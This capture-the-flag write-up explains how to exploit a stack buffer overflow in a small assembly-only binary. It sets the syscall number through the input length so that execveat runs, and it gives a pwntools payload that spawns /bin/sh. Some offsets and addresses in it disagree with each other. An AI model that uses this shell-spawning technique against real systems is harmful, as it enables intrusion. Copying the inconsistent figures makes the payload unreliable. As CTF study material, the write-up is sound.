# End

There is no `end.c` for us to see, so the only thing we can do is to `objdump` the disassembly code:

 Wow....this problem is a pure assembly code problem.
  
 Everything is `xor`ed in the beginning so, all of them are 0.
  
 After every register is zeroed, it calls `end`.
  
 What `end` does is :
  
    * rsp = rsp - 0x128
    * rsi = rsp - 0x128
    * edx = rdx = 0x148
    * sycall
 
And we can see `rax = 0` and `rdi = 0`, so `end` is a system call for `read()`.
 
    end() = read(0, rsp - 0x128, 0x148)
    
This is definitely a buffer overflow question.
 
However, what can we do? I tried a lot to overflow, such as jumping back to read again, but failed.
 
Then, when staring at `gdb-peda`, I found something interesting:
 
   rax = the length of input string
   
So, I tried to control the length to 59 to call `sys_execve` but still failed, since `/bin/sh\0` is not in rdi.
 
After that, I thought of: Maybe the input size is the key to solving this problem.
 
And.....vola! It is indeed!
 
First 0x128 + 8 = 0x130 and 0x140 is our range of overflow. Converting them into decimal, they and 304 and 336. So, let's take a look at system call table at that range.

This look really alike `execve` so maybe this is it.

After reading the `execveat manual`, I found this:

   ![end2](end2.jpg)
   
So, since what we are entering is `/bin/sh\0` , an abosulute directory, `dfd` is ignored. This means, rdi is ignored and all we have to do is put `/bin/sh\0` in rsi.

Of course, it is easy since rsi is the starting point of the user input. Therefore our payload will begin with `/bin/sh\0` then follow up with a padding of 304 - 17 = 287 bytes. 

    *   NOTE: rdx must be cleared since it is a parameter for `execveat` and in case of error.
    
Seeing the note I wrote, yes, we need to zero out rdx. We can find the method at `0x400ed: xor rdx, rdx` and this will be our return address.

Finally, our payload will be:

```python
   p.sendline(b"/bin//sh\x00" + b"\x90"*287 + p64(0x4000ed) + b"\x90"*17)
```
